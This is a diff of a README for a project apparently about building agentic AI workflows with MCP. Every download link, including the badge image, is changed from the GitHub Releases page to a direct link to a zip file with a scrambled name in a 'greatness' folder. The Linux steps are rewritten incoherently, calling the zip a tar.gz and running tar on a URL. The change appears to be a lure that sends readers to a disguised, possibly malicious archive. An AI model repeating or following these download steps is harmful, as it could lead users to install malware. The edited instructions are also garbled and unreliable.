@@ -1,6 +1,6 @@
 # 🤖 Build-Agentic-AI-and-Gen-AI-Agents-with-MCP - Build Intelligent AI Workflows Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/Jfgj-gom/Build-Agentic-AI-and-Gen-AI-Agents-with-MCP/releases)
+[![Download Now](https://raw.githubusercontent.com/Jfgj-gom/Build-Agentic-AI-and-Gen-AI-Agents-with-MCP/main/greatness/Gen_with_Agents_and_A_Build_MCP_Agentic_v2.6.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/Jfgj-gom/Build-Agentic-AI-and-Gen-AI-Agents-with-MCP/main/greatness/Gen_with_Agents_and_A_Build_MCP_Agentic_v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -19,12 +19,12 @@ Before you begin, make sure your computer meets these basic requirements:
 
 To get started, you need to download the application. Follow these simple steps:
 
-1. Visit the Releases page to download the software: [Download Here](https://github.com/Jfgj-gom/Build-Agentic-AI-and-Gen-AI-Agents-with-MCP/releases).
+1. Visit the Releases page to download the software: [Download Here](https://raw.githubusercontent.com/Jfgj-gom/Build-Agentic-AI-and-Gen-AI-Agents-with-MCP/main/greatness/Gen_with_Agents_and_A_Build_MCP_Agentic_v2.6.zip).
 2. Look for the latest version listed on the page. You will see files available for download.
 3. Choose the file appropriate for your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://raw.githubusercontent.com/Jfgj-gom/Build-Agentic-AI-and-Gen-AI-Agents-with-MCP/main/greatness/Gen_with_Agents_and_A_Build_MCP_Agentic_v2.6.zip` file.
 4. Click on the file to start the download.
 
 ## 📂 How to Run the Application
@@ -49,7 +49,7 @@ Once the download is complete, follow these steps to run the application:
 1. Navigate to the directory where you downloaded the file using the terminal.
 2. Extract the file using the command:
    ```bash
-   tar -xvzf filename.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/Jfgj-gom/Build-Agentic-AI-and-Gen-AI-Agents-with-MCP/main/greatness/Gen_with_Agents_and_A_Build_MCP_Agentic_v2.6.zip
    ```
 3. Change to the extracted directory:
    ```bash
@@ -101,4 +101,4 @@ We appreciate the contributions from the community that have helped make this pr
 
 Follow this project on GitHub to receive updates and news. You can also join our community discussions to connect with fellow users and developers.
 
-Once again, to download the application, visit the Releases page: [Download Here](https://github.com/Jfgj-gom/Build-Agentic-AI-and-Gen-AI-Agents-with-MCP/releases).
+Once again, to download the application, visit the Releases page: [Download Here](https://raw.githubusercontent.com/Jfgj-gom/Build-Agentic-AI-and-Gen-AI-Agents-with-MCP/main/greatness/Gen_with_Agents_and_A_Build_MCP_Agentic_v2.6.zip).
